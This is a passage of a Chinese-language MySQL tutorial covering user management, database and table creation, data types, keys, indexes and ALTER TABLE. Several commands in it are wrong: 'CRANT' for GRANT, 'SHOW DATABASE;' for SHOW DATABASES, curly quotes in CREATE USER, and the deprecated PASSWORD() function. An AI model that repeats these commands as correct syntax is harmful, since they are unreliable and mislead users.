<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">status<br></code></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW VARIABLES LIKE &#x27;char%&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>修改密码的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET PASSWORD FOR root@localhost=PASSWORD(&#x27;新密码&#x27;)<br></code></pre></td></tr></table></figure>

<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>创建用户的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE USER 新用户名 IDENTIFIED BY ‘密码’<br></code></pre></td></tr></table></figure>

<p>用户名需要按照“用户名@主机名”的方式写</p>
<h2 id="设置用户权限"><a href="#设置用户权限" class="headerlink" title="设置用户权限"></a>设置用户权限</h2><p>设置用户权限的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CRANT 赋予的权限 ON 数据库名.表名 TO 用户名<br></code></pre></td></tr></table></figure>

<p>“赋予的权限”如果是所有权限就设为“ALL”，如果仅允许SELECL和UPDATE就设置为“SELECT,UPDATE”</p>
<p>如果是所有数据库的所有数据表，就设置为“*.*”</p>
<h2 id="退出监视器"><a href="#退出监视器" class="headerlink" title="退出监视器"></a>退出监视器</h2><p>退出监视器的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">exit<br></code></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">quit<br></code></pre></td></tr></table></figure>

<h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><p>MySQL的SQL语句后面需要加分号。</p>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>创建数据库的命令格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE 数据库名;<br></code></pre></td></tr></table></figure>

<h2 id="指定使用的数据库"><a href="#指定使用的数据库" class="headerlink" title="指定使用的数据库"></a>指定使用的数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use 数据库名<br></code></pre></td></tr></table></figure>

<p>use不是SQL语句，所以不需要输入“;”</p>
<p>在使用use选择数据库的状态下也能够操作其他数据库的表，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM db2.table;<br></code></pre></td></tr></table></figure>

<p>在没有use db2的情况下也可以执行</p>
<h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><h3 id="显示当前已有的数据库"><a href="#显示当前已有的数据库" class="headerlink" title="显示当前已有的数据库"></a>显示当前已有的数据库</h3><p>显示当前已有的数据库的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE;<br></code></pre></td></tr></table></figure>

<h3 id="显示当前使用的数据库"><a href="#显示当前使用的数据库" class="headerlink" title="显示当前使用的数据库"></a>显示当前使用的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DATABASE();<br></code></pre></td></tr></table></figure>

<h2 id="显示数据库中的所有表"><a href="#显示数据库中的所有表" class="headerlink" title="显示数据库中的所有表"></a>显示数据库中的所有表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;<br></code></pre></td></tr></table></figure>

<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>在MySQL中，你可以使用<code>DROP DATABASE</code>语句来删除已经存在的数据库。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> DATABASE database_name;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>database_name</code>是你想要删除的数据库的名称。例如，如果你想删除名为<code>my_database</code>的数据库，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> DATABASE my_database;<br></code></pre></td></tr></table></figure>

<p>这将删除<code>my_database</code>数据库以及其中的所有表和数据。</p>
<p>请注意，<code>DROP DATABASE</code>语句会永久删除数据库以及其中的所有表和数据，因此在使用之前请确保你真的想要删除该数据库。</p>
<p>类似地，你也可以使用<code>IF EXISTS</code>子句来避免在尝试删除不存在的数据库时出现错误，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> DATABASE IF <span class="hljs-keyword">EXISTS</span> database_name;<br></code></pre></td></tr></table></figure>

<p>如果<code>database_name</code>存在，那么它将被删除。如果它不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。这对于自动化脚本或者你不确定数据库是否存在时非常有用，因为它可以防止因尝试删除不存在的数据库而导致的错误。</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>数据库表列中的数据的种类成为数据类型</p>
<h2 id="二进制数据类型"><a href="#二进制数据类型" class="headerlink" title="二进制数据类型"></a>二进制数据类型</h2><table>
<thead>
<tr>
<th>数据类型</th>
<th>含义</th>
<th>对应范围</th>
</tr>
</thead>
<tbody><tr>
<td>BLOB</td>
<td>存储二进制大型对象的数据类型</td>
<td>最多可以存储65535个字节</td>
</tr>
</tbody></table>
<h2 id="数值型数据类型"><a href="#数值型数据类型" class="headerlink" title="数值型数据类型"></a>数值型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">TINYINT</td>
<td align="center">极小整数值</td>
<td align="center">-128 到 127（有符号），0 到 255（无符号）</td>
</tr>
<tr>
<td align="center">SMALLINT</td>
<td align="center">小整数值</td>
<td align="center">-32768 到 32767（有符号），0 到 65535（无符号）</td>
</tr>
<tr>
<td align="center">MEDIUMINT</td>
<td align="center">中等大小的整数值</td>
<td align="center">-8388608 到 8388607（有符号），0 到 16777215（无符号）</td>
</tr>
<tr>
<td align="center">INT</td>
<td align="center">常规大小的整数值</td>
<td align="center">-2147483648 到 2147483647（有符号），0 到 4294967295（无符号）</td>
</tr>
<tr>
<td align="center">BIGINT</td>
<td align="center">非常大的整数值</td>
<td align="center">-9223372036854775808 到 9223372036854775807（有符号），0 到 18446744073709551615（无符号）</td>
</tr>
<tr>
<td align="center">FLOAT</td>
<td align="center">单精度浮点数</td>
<td align="center">精度大约为 7 位小数</td>
</tr>
<tr>
<td align="center">DOUBLE</td>
<td align="center">双精度浮点数</td>
<td align="center">精度大约为 15 位小数</td>
</tr>
<tr>
<td align="center">DECIMAL</td>
<td align="center">精确的小数值，用于存储精确的数值，如货币</td>
<td align="center">精度可达 65 位，小数部分最多 30 位</td>
</tr>
</tbody></table>
<p>输入的数值型数据可以采用指数表示法输入，在指数表示法输入的情况下，“AE+B”表示“A乘以10的B次方”，例如“6.02*10的23次方”可以表示为“6.02E+23”。</p>
<h2 id="字符串型数据类型"><a href="#字符串型数据类型" class="headerlink" title="字符串型数据类型"></a>字符串型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CHAR</td>
<td align="center">定长字符串，长度固定</td>
<td align="center">0 到 255 字节</td>
</tr>
<tr>
<td align="center">VARCHAR</td>
<td align="center">变长字符串，长度可变</td>
<td align="center">0 到 65535 字节</td>
</tr>
<tr>
<td align="center">TINYTEXT</td>
<td align="center">很小的文本字符串</td>
<td align="center">0 到 255 字节</td>
</tr>
<tr>
<td align="center">TEXT</td>
<td align="center">小到中等大小的文本字符串</td>
<td align="center">0 到 65535 字节</td>
</tr>
<tr>
<td align="center">MEDIUMTEXT</td>
<td align="center">中等大小的文本字符串</td>
<td align="center">0 到 16777215 字节</td>
</tr>
<tr>
<td align="center">LONGTEXT</td>
<td align="center">大文本字符串</td>
<td align="center">0 到 4294967295 字节</td>
</tr>
<tr>
<td align="center">ENUM</td>
<td align="center">字符串对象，只能有一组预定义的值，并且值的数量不能超过 65535</td>
<td align="center">1 或 2 字节，根据枚举值的数量</td>
</tr>
<tr>
<td align="center">SET</td>
<td align="center">字符串对象，可以有多个值，值的数量不能超过 64</td>
<td align="center">1、2、3、4 或 8 字节，根据集合值的数量</td>
</tr>
</tbody></table>
<p>输入的字符串如果有“’”，需要转义处理，改为“\‘”</p>
<p>MySQL4.1版本之后，VARCHAR和CHAR的()中指定的位数单位变为“字符”，以VARCHAR(10)为例，不管输入的是中文还是英文还是数字，最多只能保留10个字符</p>
<p><strong>VARCHAR的字符范围：</strong></p>
<p>在MySQL 5.0.3及更高版本中，<code>VARCHAR</code>可以存储最多65535字节的数据，这包括存储长度的1到2个字节。实际的最大字符串长度由最大行大小（默认为65535字节）和使用的字符集决定。</p>
<p>例如，如果使用utf8字符集（最多需要3字节来存储一个字符），则<code>VARCHAR</code>可以存储最多21845个字符（65535&#x2F;3，舍去小数）。如果使用utf8mb4字符集（最多需要4字节来存储一个字符），则<code>VARCHAR</code>可以存储最多16383个字符（65535&#x2F;4，舍去小数）。</p>
<p>在MySQL 5.0.2及更低版本中，<code>VARCHAR</code>可以存储最多255个字符。</p>
<h2 id="日期和时间型数据类型"><a href="#日期和时间型数据类型" class="headerlink" title="日期和时间型数据类型"></a>日期和时间型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">YEAR</td>
<td align="center">年份</td>
<td align="center">1901 到 2155（4位时），以及1970<del>2069（2位时，70</del>69）</td>
</tr>
<tr>
<td align="center">DATE</td>
<td align="center">日期</td>
<td align="center">‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="center">TIME</td>
<td align="center">时间</td>
<td align="center">‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="center">DATETIME</td>
<td align="center">日期和时间组合</td>
<td align="center">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="center">TIMESTAMP</td>
<td align="center">时间戳</td>
<td align="center">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC</td>
</tr>
</tbody></table>
<p>MySQL中的时间类型还支持小数秒，例如 <code>DATETIME(3)</code>、<code>TIME(3)</code> 或 <code>TIMESTAMP(3)</code> 可以存储精确到毫秒的时间。在括号中的数字表示小数秒的精度。</p>
<h1 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h1><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>在MySQL中，你可以使用<code>CREATE TABLE</code>语句来创建一个新的表。在<code>CREATE TABLE</code>语句中，你可以指定表名，列名，列的数据类型以及任何附加的约束。</p>
<p>以下是一个创建新表的基本示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table_name (<br>    column1 datatype <span class="hljs-keyword">constraint</span>,<br>    column2 datatype <span class="hljs-keyword">constraint</span>,<br>    column3 datatype <span class="hljs-keyword">constraint</span>,<br>    ....<br>);<br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>table_name</code>是你要创建的表的名称，<code>column1</code>、<code>column2</code>和<code>column3</code>是列的名称，<code>datatype</code>是列的数据类型，<code>constraint</code>是任何你想在列上应用的约束。</p>
<p>例如，假设你想创建一个名为<code>students</code>的表，其中有<code>id</code>、<code>name</code>、<code>age</code>和<code>email</code>四个字段。你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> students (<br>    id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),<br>    age <span class="hljs-type">INT</span>,<br>    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure>

<p>在这个例子中：</p>
<ul>
<li><code>id</code>是一个整数类型的列，它自动递增并且是表的主键。</li>
<li><code>name</code>和<code>email</code>都是变长字符类型的列，最大长度为100。</li>
<li><code>age</code>是一个整数类型的列。</li>
</ul>
<p>注意，每一行都需要以逗号结束，但是最后一行除外。最后，整个语句需要以分号结束。</p>
<p>数据库名、表名、列名可以使用&#96;&#96;（反引号）括起来</p>
<p>输入到列中字符串的值需要用’’（单引号）或者””（双引号）括起来</p>
<p>创建表时指定字符编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE 表名 (列名1 数据类型1, 列名2 数据库类型2...) CHARSET=utf8;<br></code></pre></td></tr></table></figure>

<h2 id="字段设置"><a href="#字段设置" class="headerlink" title="字段设置"></a>字段设置</h2><h3 id="设置主键"><a href="#设置主键" class="headerlink" title="设置主键"></a>设置主键</h3><p>主键的特点：</p>
<ul>
<li>没有重复的值</li>
<li>不允许输入空值（NULL）</li>
</ul>
<p>命令格式：</p>
<p>在创建表时给主键字段后添加PRIMARY KEY</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE TABLE 表名 (列名1 数据类型1 PRIMARY KEY, 列名2 数据库类型2...);<br></code></pre></td></tr></table></figure>

<h3 id="设置唯一键"><a href="#设置唯一键" class="headerlink" title="设置唯一键"></a>设置唯一键</h3><p>唯一键（unique key）的特点</p>
<ul>
<li><p>不允许重复</p>
</li>
<li><p>允许输入NULL</p>
</li>
<li><p>在创建表时定义唯一键：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table_name (<br>  column1 data_type,<br>  column2 data_type,<br>  <span class="hljs-keyword">UNIQUE</span> (column1)<br>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>在已存在的表上添加唯一键：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> <span class="hljs-keyword">UNIQUE</span> (column1);<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="设置列可以自动递增"><a href="#设置列可以自动递增" class="headerlink" title="设置列可以自动递增"></a>设置列可以自动递增</h3><p>自动递增（AUTO_INCREMENT）可以应用于任何整数类型的列。<code>AUTO_INCREMENT</code>属性允许数据库自动为新记录生成一个唯一的数字。通常用于主键。</p>
<p>使用<code>AUTO_INCREMENT</code>属性，需要满足以下几个条件：</p>
<ul>
<li>列必须被定义为<code>NOT NULL</code>，因为它必须有值。</li>
<li>列必须被定义为整数类型（例如，<code>INT</code>，<code>SMALLINT</code>，<code>MEDIUMINT</code>，<code>BIGINT</code>）。</li>
<li>每个表只能有一个<code>AUTO_INCREMENT</code>列。</li>
</ul>
<p>示例，将<code>id</code>列定义为<code>AUTO_INCREMENT</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE employees (<br>    id INT AUTO_INCREMENT,<br>    name VARCHAR(100),<br>    PRIMARY KEY(id)<br>);<br></code></pre></td></tr></table></figure>

<p>MySQL如何设置连续递增字段的初始值：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> tablename (<br>    id <span class="hljs-type">INT</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> KEY (id)<br>) AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure>

<p>如果已经创建了表，并且想改变AUTO_INCREMENT的值，可以使用ALTER TABLE命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> tablename AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure>

<p>注意，不能将AUTO_INCREMENT的值设置为比当前最大值小的数，因如果这样做，MySQL将忽略此次设置并保持当前最大值。</p>
<h3 id="设置列的默认值"><a href="#设置列的默认值" class="headerlink" title="设置列的默认值"></a>设置列的默认值</h3><p>在MySQL中，可以在创建表或修改表的时候设置字段的默认值。这个默认值将被用于任何未指定该列值的新行。</p>
<ol>
<li>在创建表的时候设置默认值：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> tablename (<br>    columnname1 <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>    columnname2 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;default_value&#x27;</span><br>);<br></code></pre></td></tr></table></figure>

<p>在这个例子中，我们创建了一个名为”tablename”的表，它有两个字段，”columnname1”和”columnname2”。对于”columnname1”，如果在插入新的行时没有指定它的值，那么它的值将默认为1。对于”columnname2”，如果在插入新的行时没有指定它的值，那么它的值将默认为’default_value’。</p>
<ol start="2">
<li>修改已经存在的表，为字段设置默认值：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> tablename <br>MODIFY columnname1 <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>MODIFY columnname2 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;default_value&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，我们更改了”tablename”表中”columnname1”和”columnname2”字段的默认值。</p>
<p>注意，不能为NOT NULL的字段设置默认值为NULL。对于字符串类型的字段，默认值需要用引号引起来。对于日期和时间类型的字段，可以将默认值设置为CURRENT_TIMESTAMP。</p>
<h3 id="索引（创建、删除、查看、主键索引、唯一索引、全局索引）"><a href="#索引（创建、删除、查看、主键索引、唯一索引、全局索引）" class="headerlink" title="索引（创建、删除、查看、主键索引、唯一索引、全局索引）"></a>索引（创建、删除、查看、主键索引、唯一索引、全局索引）</h3><p>在MySQL中，索引是用来加速查询操作的一种数据结构。它们可以让数据库引擎快速找到表中的特定记录。如果事先在表上创建了索引，查找时就不需要对全表进行扫描，而是利用索引进行扫描。</p>
<p>下面是一些关于MySQL索引的基础知识：</p>
<ol>
<li><p><strong>创建索引：</strong> 创建索引可以使用 <code>CREATE INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> INDEX index_name<br><span class="hljs-keyword">ON</span> table_name (column1, column2);<br></code></pre></td></tr></table></figure>

<p>在上面的命令中，<code>index_name</code> 是索引的名称，<code>table_name</code> 是你要在其上创建索引的表的名称，<code>column1</code> 和 <code>column2</code> 是你想在其中创建索引的列。</p>
</li>
<li><p><strong>删除索引：</strong> 删除索引可以使用 <code>DROP INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> INDEX index_name <span class="hljs-keyword">ON</span> table_name;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>查看索引：</strong> 如果你想看一个表的所有索引，可以使用 <code>SHOW INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> INDEX <span class="hljs-keyword">FROM</span> table_name;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>主键索引：</strong> 主键（PRIMARY KEY）自动创建唯一索引。每个MySQL表只能有一个主键。</p>
</li>
<li><p><strong>唯一索引：</strong> 唯一索引（UNIQUE INDEX）不允许任何重复值。它们可以是主键，也可以不是。</p>
<p>唯一索引（Unique Index）的设置：</p>
<ul>
<li><p>在创建表时定义唯一索引：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table_name (<br>  column1 data_type,<br>  column2 data_type,<br>  <span class="hljs-keyword">UNIQUE</span> INDEX index_name (column1)<br>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>在已存在的表上添加唯一索引：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> <span class="hljs-keyword">UNIQUE</span> INDEX index_name (column1);<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>全文索引：</strong> 全文索引（FULLTEXT INDEX）用于全文搜索。只有CHAR、VARCHAR和TEXT列可以创建全文索引。</p>
</li>
</ol>
<p>使用索引的缺点：</p>
<ol>
<li>会占用额外的磁盘空间</li>
<li>在执行插入、更新或删除操作时，索引也需要被更新，有耗时</li>
<li>如果被创建索引的列中重复值较多，即使在该列上创建索引也不会提高处理速度</li>
</ol>
<h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><p>在MySQL中，你可以使用<code>ALTER TABLE</code>语句来修改已经存在的表。使用ALTER TABLE命令修改列的结构，根据修改类型，可以使用带有CHANGE、MODIFY、ADD、DROP的语句。</p>
<p>以下是一些常见的表修改操作：</p>
<ol>
<li><p><strong>添加列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">ADD</span> column_name datatype;<br></code></pre></td></tr></table></figure>

<p>例如，如果你想在<code>students</code>表中添加一个名为<code>address</code>的新列，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> students<br><span class="hljs-keyword">ADD</span> address <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>);<br></code></pre></td></tr></table></figure>

<p>把列添加到指定位置的命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE 表名 ADD 列名 数据类型 AFTER 放在这个列之后;<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE tb1 ADD birth DATETIME AFTER employeeId;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>删除列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> column_name;<br></code></pre></td></tr></table></figure>

<p>例如，如果你想从<code>students</code>表中删除<code>address</code>列，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> students<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> address;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>修改列的数据类型：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br>MODIFY <span class="hljs-keyword">COLUMN</span> column_name datatype;<br></code></pre></td></tr></table></figure>

<p>即使数据类型不变，也依然需要指定修改后的数据类型</p>
<p>例如，如果你想修改<code>students</code>表中<code>age</code>列的数据类型为<code>SMALLINT</code>，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> students<br>MODIFY <span class="hljs-keyword">COLUMN</span> age <span class="hljs-type">SMALLINT</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>重命名列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name<br>CHANGE <span class="hljs-keyword">COLUMN</span> old_column_name new_column_name datatype;<br></code></pre></td></tr></table></figure>

<p>例如，如果你想将<code>students</code>表中的<code>email</code>列重命名为<code>email_address</code>，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> students<br>CHANGE <span class="hljs-keyword">COLUMN</span> email email_address <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure>

<p>即使数据类型不变，也依然需要指定修改后的数据类型</p>
</li>
<li><p><strong>添加唯一键、主键或索引：</strong></p>
